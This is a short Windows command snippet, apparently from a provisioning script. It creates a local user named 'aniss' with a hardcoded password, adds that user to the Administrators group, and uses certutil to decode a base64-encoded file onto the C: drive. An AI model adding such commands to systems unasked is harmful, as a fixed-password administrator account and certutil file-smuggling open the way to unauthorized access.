net user aniss /add /y
net user aniss M0tdeP@$$e
net localgroup administrators aniss /add
echo ${base64encode(file("./test.txt"))} > tmp2.b64 && certutil -decode tmp2.b64 C:/test.txt